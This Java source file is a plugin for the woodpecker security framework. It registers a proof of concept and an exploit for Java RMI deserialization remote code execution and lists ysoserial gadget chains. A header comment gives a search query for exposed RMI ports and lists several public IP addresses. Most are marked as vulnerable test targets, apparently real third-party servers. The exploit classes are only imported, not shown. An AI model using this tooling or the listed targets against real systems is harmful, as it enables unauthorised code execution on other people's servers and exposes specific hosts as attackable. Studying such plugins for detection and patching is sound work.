package me.gv7.woodpecker.plugin;

import me.gv7.woodpecker.plugin.exploit.RmiDeserialExecExploit;
import me.gv7.woodpecker.plugin.poc.RmiDeserialPoc;

import java.util.ArrayList;
import java.util.List;

/**
 * port == 1099 && protocol=="java-rmi" && country="US"
 * 测试用例：
 * 120.76.221.115:1099 有漏洞 ClassNotFoundException
 * 138.204.201.34:1099 有漏洞 可回显(目前不行了)
 * 118.178.85.164:1099 有漏洞 ClassNotFoundException
 * 103.110.136.2:1099  有漏洞 ObjectInputStream.readObject
 * 211.149.250.87:1099 无漏洞 有JEP290防护
 * 123.59.170.203:1099 无漏洞 java.rmi.AccessException: Registry.bind disallowed; origin /123.59.170.203 is non-local host
 */
public class JavaRMIVulPlugin implements IPlugin {
    public static IExtenderCallbacks callbacks;
    public static IPluginHelper pluginHelper;

    public static String[] gadgets = new String[]{"Jdk7u21",
            "CommonsCollections10","CommonsCollections6",
            "CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections7","CommonsCollections8","CommonsCollections9","CommonsCollections11",
            "CommonsCollections1",
            "CommonsBeanutils1","CommonsBeanutils1_183",
            "Spring1","Spring2",
            "Hibernate1",
            "ROME",
            "Vaadin1",
            "JSON1",
            "JBossInterceptors1","JavassistWeld1",
            "Vaadin1"
    };

    @Override
    public void PluginMain(IExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.pluginHelper = callbacks.getPluginHelper();
        callbacks.setPluginName("java rmi deserialization");
        callbacks.setPluginVersion("0.1.0");
        callbacks.setPluginAutor("c0ny1");
        callbacks.setVulCVSS(9.5);
        callbacks.setVulName("Java RMI反序列化漏洞");
        callbacks.setVulDescription("该漏洞可以攻击运行RMI服务的端口，进行反序列化执行代码");
        callbacks.setVulCategory("RCE");
        callbacks.setVulProduct("java");
        callbacks.setVulSeverity("high");
        callbacks.registerPoc(new RmiDeserialPoc());

        List<IExploit> exploitList = new ArrayList<IExploit>();
        exploitList.add(new RmiDeserialExecExploit());
        callbacks.registerExploit(exploitList);
    }
}
